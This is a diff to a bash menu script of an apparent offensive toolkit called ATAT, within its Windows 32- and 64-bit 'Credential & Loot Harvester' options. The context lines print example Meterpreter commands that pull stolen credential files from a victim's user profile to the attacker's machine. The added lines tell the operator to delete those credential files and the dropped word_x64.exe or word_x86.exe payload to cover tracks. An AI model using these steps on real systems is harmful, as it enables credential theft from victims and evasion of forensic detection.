@@ -1553,6 +1553,7 @@ do
 		echo -e "\E[1;34m::::: \e[97m*EXAMPLE* Meterpreter Command To Download Your Loot \E[1;34m:::::"
 		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.txt' /root/ATAT/ \e[97m\E[1;34m"
 		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
+		echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The \"credentials_xxxxxxxx_xxxxxx\" TXT & JSON Files & word_x64.exe \E[1;34m:::::"
 			;;
 		"Windows 32 bit Credenital & Loot Harvester")
     SERVICE=Apache;
@@ -1588,6 +1589,7 @@ do
 		echo -e "\E[1;34m::::: \e[97m*EXAMPLE* Meterpreter Command To Download Your Loot \E[1;34m:::::"
 		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.txt' /root/ATAT/ \e[97m\E[1;34m"
 		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
+		echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The \"credentials_xxxxxxxx_xxxxxx\" TXT & JSON Files & word_x86.exe \E[1;34m:::::"
 			;;
         "Main Menu")
             ~/ATAT/ATAT.sh
